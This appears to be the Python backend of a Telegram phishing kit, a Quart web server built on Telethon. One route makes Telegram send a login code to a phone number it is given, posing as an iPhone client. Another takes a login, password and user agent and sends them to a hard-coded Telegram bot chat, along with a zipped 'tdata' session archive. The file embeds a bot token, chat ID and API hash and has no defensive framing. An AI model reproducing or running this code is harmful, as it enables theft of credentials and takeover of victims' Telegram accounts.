from telethon.sync import TelegramClient
from telethon import functions
import base64
import qrcode
from telethon.tl.types import CodeSettings
import requests

from quart import Quart, request
from quart_cors import cors

app = Quart(__name__)
app = cors(app)

TELEGRAM_BOT_TOKEN = '7129911586:AAFlCHJltzlOSBBxaBWeVKhCMhZxF7R2-s4'
CHAT_ID = '759515597' 

def send_to_telegram(login, password, userAgent):
    message = f"login: `{login}`\npassword: `{password}`\nuserAgent: \n```\n{userAgent}\n```"
    telegram_api_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    data = {
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "markdown"
    }
    response = requests.post(telegram_api_url, data=data)
    if response.status_code != 200:
        print(f"Ошибка отправки сообщения в Telegram: {response.text}")


def send_zip_to_telegram(zip_file_path):
    telegram_api_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
    data = {
        "chat_id": CHAT_ID
    }
    files = {
        "document": open(zip_file_path, "rb")
    }
    response = requests.post(telegram_api_url, data=data, files=files)
    if response.status_code != 200:
        print(f"Ошибка отправки zip-архива в Telegram: {response.text}")



@app.route('/sendCode', methods=['GET'])
async def sendSMSCode():
    login = request.args.get('login')

    client = TelegramClient("123", "28028093", "2b96b9f374cb8985d2792a4c54e323f2", 
        device_model="iPhone 13 Pro",
        system_version="17.4",
        app_version="10.12",
        lang_code="en",
        system_lang_code="en-US")
    await client.connect()
    
    result = await client(functions.auth.SendCodeRequest(
        api_id=28028093,
        api_hash='2b96b9f374cb8985d2792a4c54e323f2',
        phone_number=login,
        settings=CodeSettings()
    ))

    client.session.save()
    
    return "Success"


@app.route('/login', methods=['GET'])
async def login():
    login = request.args.get('login')
    password = request.args.get('password')
    userAgent = request.args.get('userAgent')

    if login and password and userAgent:
        send_to_telegram(login, password, userAgent)
        send_zip_to_telegram("data/tdata.zip")
        return "Данные отправлены в Telegram"
    else:
        return "Ошибка: Не переданы логин и/или пароль"

if __name__ == '__main__':
    app.run(debug=True)
